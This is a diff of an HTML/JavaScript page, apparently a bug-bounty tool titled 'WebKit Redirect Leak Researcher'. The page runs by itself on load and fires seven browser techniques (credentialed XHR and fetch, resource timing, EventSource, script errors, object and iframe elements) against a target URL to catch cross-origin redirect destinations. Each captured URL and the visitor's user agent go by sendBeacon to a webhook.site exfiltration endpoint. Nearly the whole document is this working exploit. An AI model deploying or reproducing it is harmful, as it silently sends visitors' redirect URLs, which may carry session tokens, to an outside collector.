@@ -1,156 +1,216 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
     <meta charset='utf-8' />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner</title>
+    <title>WebKit Redirect Leak Researcher - Putra Mahardika</title>
     <style>
-        body { font-family: monospace; padding: 20px; color: #000; background: #fff; }
-        .input-group { margin-bottom: 20px; }
-        input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #000; box-sizing: border-box; font-family: monospace; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { padding: 10px; cursor: pointer; border: 1px solid #000; background: #fff; font-family: monospace; text-align: left; }
-        button:active { background: #eee; }
-        pre { margin-top: 20px; border: 1px solid #000; padding: 10px; min-height: 200px; white-space: pre-wrap; font-size: 12px; }
-        .leak { background: #000; color: #fff; font-weight: bold; padding: 2px; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
+            padding: 20px;
+            line-height: 1.4;
+        }
+
+        .container {
+            border: 1px solid #00ff41;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px #00ff41;
+            max-width: 900px;
+            margin: auto;
+        }
+
+        h2 {
+            border-bottom: 1px solid #00ff41;
+            padding-bottom: 10px;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .log-item {
+            margin-bottom: 5px;
+            border-left: 3px solid #333;
+            padding-left: 10px;
+            font-size: 12px;
+            word-break: break-all;
+        }
+
+        .leak {
+            color: #ff3e3e;
+            font-weight: bold;
+            border-left: 3px solid #ff3e3e;
+            background: rgba(255, 62, 62, 0.1);
+            padding: 5px 10px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #333;
+            margin: 20px 0;
+        }
+
+        #status {
+            font-weight: bold;
+            color: #f1c40f;
+        }
     </style>
 </head>
+
 <body>
-
-    <div class="input-group">
-        <input type="text" id="target" value="https://fb.com/4">
-        <input type="text" id="exfil" value="https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594">
+    <div class="container">
+        <h2>[!] WebKit Redirect Leak Analyser</h2>
+        <p>Target: <span id="target_display" style="color: #3498db;"></span></p>
+        <div id="status">[*] Ready. Waiting for trigger...</div>
+        <hr>
+        <div id="logs"></div>
     </div>
-
-    <div class="grid">
-        <button onclick="testXHR()">1. XHR (responseURL)</button>
-        <button onclick="testFetch()">2. Fetch (Error Msg)</button>
-        <button onclick="testPerf()">3. Performance Timing</button>
-        <button onclick="testES()">4. EventSource</button>
-        <button onclick="testScript()">5. Script Error</button>
-        <button onclick="testWorker()">6. Web Worker</button>
-        <button onclick="testImport()">7. Dynamic Import</button>
-        <button onclick="testAudio()">8. Audio Object</button>
-        <button onclick="testIframe()">9. Iframe Location</button>
-        <button onclick="clearLogs()">0. Clear Logs</button>
-    </div>
-
-    <pre id="logs"></pre>
 
     <script>
-        const getT = () => document.getElementById('target').value;
-        const getE = () => document.getElementById('exfil').value;
-        const logArea = document.getElementById('logs');
+        // --- CONFIGURATION ---
+        const CONFIG = {
+            target: 'https://fb.com/4', // Ganti dengan URL target redirect
+            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594', // Ganti dengan URL exfil lu
+            myOrigin: window.location.origin
+        };
 
-        function out(msg, isLeak = false) {
-            const span = document.createElement('span');
-            if (isLeak) span.className = 'leak';
-            span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-            logArea.appendChild(span);
-            logArea.scrollTop = logArea.scrollHeight;
+        document.getElementById('target_display').innerText = CONFIG.target;
+
+        // --- UTILS ---
+        function log(msg, isLeak = false) {
+            const div = document.createElement('div');
+            div.className = isLeak ? 'log-item leak' : 'log-item';
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('logs').prepend(div);
+            console.log(msg);
         }
 
-        function send(data, type) {
-            if (!data || data === getT()) return;
-            out(`LEAK: ${data}`, true);
-            navigator.sendBeacon(getE(), JSON.stringify({type, data, ua: navigator.userAgent}));
+        function report(data, method) {
+            // Filter agar tidak mereport URL origin sendiri atau target awal yang sudah diketahui
+            if (!data || data === CONFIG.target || data === CONFIG.myOrigin + '/') return;
+            
+            log(`ALERT: LEAK DETECTED via ${method}!`, true);
+            log(`DATA: ${data}`, true);
+
+            // Exfiltrasi data menggunakan sendBeacon (lebih stabil saat tab ditutup/redirect)
+            navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
+                method: method,
+                leaked_url: data,
+                ua: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            }));
         }
 
-        function clearLogs() { logArea.innerText = ''; }
+        // --- CORE EXPLOIT VECTORS ---
+        async function startExploit() {
+            log("[*] Initializing multi-vector analysis...");
 
-        function testXHR() {
-            out('Testing XHR...');
+            // 1. Performance Resource Timing (Microtask/Event Loop)
+            const observer = new PerformanceObserver((list) => {
+                list.getEntries().forEach((entry) => {
+                    if (entry.name !== CONFIG.target && entry.name.startsWith('http')) {
+                        report(entry.name, 'Resource-Timing');
+                    }
+                });
+            });
+            observer.observe({ entryTypes: ['resource'] });
+
+            // 2. XMLHttpRequest State Check
             const xhr = new XMLHttpRequest();
-            xhr.open('GET', getT(), true);
+            xhr.open('GET', CONFIG.target, true);
             xhr.withCredentials = true;
-            xhr.onreadystatechange = () => { if (xhr.responseURL) send(xhr.responseURL, 'XHR'); };
-            xhr.onerror = () => { send(xhr.responseURL, 'XHR-Error'); };
+            xhr.onreadystatechange = () => {
+                if (xhr.responseURL && xhr.responseURL !== CONFIG.target) {
+                    report(xhr.responseURL, 'XHR-ResponseURL');
+                }
+            };
+            xhr.onerror = () => {
+                log("[*] XHR Error (CORS/SOP Policy enforced)");
+                if(xhr.responseURL) report(xhr.responseURL, 'XHR-Error-State');
+            };
             xhr.send();
-        }
 
-        function testFetch() {
-            out('Testing Fetch...');
-            fetch(getT(), { mode: 'cors', credentials: 'include' })
-                .then(r => send(r.url, 'Fetch'))
-                .catch(e => {
-                    const m = e.message.match(/(https?:\/\/[^\s]+)/);
-                    if (m) send(m[0], 'Fetch-Msg');
-                    else out('Fetch Blocked: ' + e.message);
-                });
-        }
-
-        function testPerf() {
-            out('Testing PerformanceObserver...');
-            const obs = new PerformanceObserver((l) => {
-                l.getEntries().forEach(e => {
-                    if (e.name !== getT() && e.name.startsWith('http')) send(e.name, 'Perf');
-                });
-            });
-            obs.observe({ entryTypes: ['resource'] });
-            fetch(getT(), { mode: 'no-cors' });
-        }
-
-        function testES() {
-            out('Testing EventSource...');
+            // 3. EventSource URL Quirks (Macrotask: setTimeout)
             try {
-                const es = new EventSource(getT());
+                const es = new EventSource(CONFIG.target);
                 setTimeout(() => {
-                    send(es.url, 'EventSource');
+                    if (es.url && es.url !== CONFIG.target) {
+                        report(es.url, 'EventSource-URL');
+                    }
                     es.close();
-                }, 1500);
-            } catch(e) { out(e.message); }
-        }
+                }, 3000);
+            } catch (e) { }
 
-        function testScript() {
-            out('Testing Script Tag...');
-            const handler = (m, s) => {
-                send(s, 'Script-Error');
-                window.removeEventListener('error', handler);
+            // 4. Fetch Rejection Analysis (Promises)
+            fetch(CONFIG.target, { mode: 'cors', credentials: 'include' })
+                .then(r => {
+                    if (r.url !== CONFIG.target) report(r.url, 'Fetch-Resolved');
+                })
+                .catch(err => {
+                    log(`[*] Fetch Rejected: ${err.message}`);
+                    const urlMatch = err.message.match(/(https?:\/\/[^\s]+)/);
+                    if (urlMatch) report(urlMatch[0], 'Fetch-Error-Message');
+                });
+
+            // 5. Script Tag Global Error
+            window.onerror = (msg, src) => {
+                if (src && src !== CONFIG.target && src !== window.location.href) {
+                    report(src, 'Window-OnError');
+                }
+                return true;
             };
-            window.addEventListener('error', handler);
             const s = document.createElement('script');
-            s.src = getT();
+            s.src = CONFIG.target;
             document.body.appendChild(s);
-        }
 
-        function testWorker() {
-            out('Testing Worker...');
-            try {
-                const w = new Worker(getT());
-                w.onerror = (e) => { send(e.filename, 'Worker'); };
-            } catch (e) {
-                const m = e.message.match(/(https?:\/\/[^\s]+)/);
-                if (m) send(m[0], 'Worker-Catch');
-            }
-        }
-
-        function testImport() {
-            out('Testing Dynamic Import...');
-            import(getT()).catch(e => {
-                const m = e.message.match(/(https?:\/\/[^\s]+)/);
-                if (m) send(m[0], 'Import-Leak');
-                else out('Import Error: ' + e.message);
-            });
-        }
-
-        function testAudio() {
-            out('Testing Audio...');
-            const a = new Audio();
-            a.onerror = () => { send(a.src, 'Audio-Src-Error'); };
-            a.src = getT();
-        }
-
-        function testIframe() {
-            out('Testing Iframe...');
-            const f = document.createElement('iframe');
-            f.style.display = 'none';
-            f.src = getT();
-            f.onload = () => {
-                try { out('Iframe URL: ' + f.contentWindow.location.href); } 
-                catch(e) { out('Iframe SOP Blocked (Expected)'); }
+            // 6. Object Element Data Leak
+            const obj = document.createElement('object');
+            obj.style.width = '0'; obj.style.height = '0';
+            obj.data = CONFIG.target;
+            obj.onload = () => {
+                try {
+                    if (obj.data && obj.data !== CONFIG.target) {
+                        report(obj.data, 'Object-Data-Attr');
+                    }
+                } catch(e) {}
             };
-            document.body.appendChild(f);
+            document.body.appendChild(obj);
+
+            // 7. Iframe Location Leak (Shadow DOM/SOP Test)
+            const ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            ifr.src = CONFIG.target;
+            ifr.onload = () => {
+                try {
+                    const loc = ifr.contentWindow.location.href;
+                    if (loc && loc !== "about:blank") report(loc, 'Iframe-Location');
+                } catch(e) {}
+            };
+            document.body.appendChild(ifr);
         }
+
+        // --- BOOTSTRAP ---
+        window.onload = () => {
+            // Menggunakan requestAnimationFrame agar browser selesai rendering dulu
+            requestAnimationFrame(() => {
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "[+] Analysis Running...";
+                    document.getElementById('status').style.color = "#00ff41";
+                    startExploit();
+                }, 1000);
+            });
+        };
     </script>
 </body>
+
 </html>
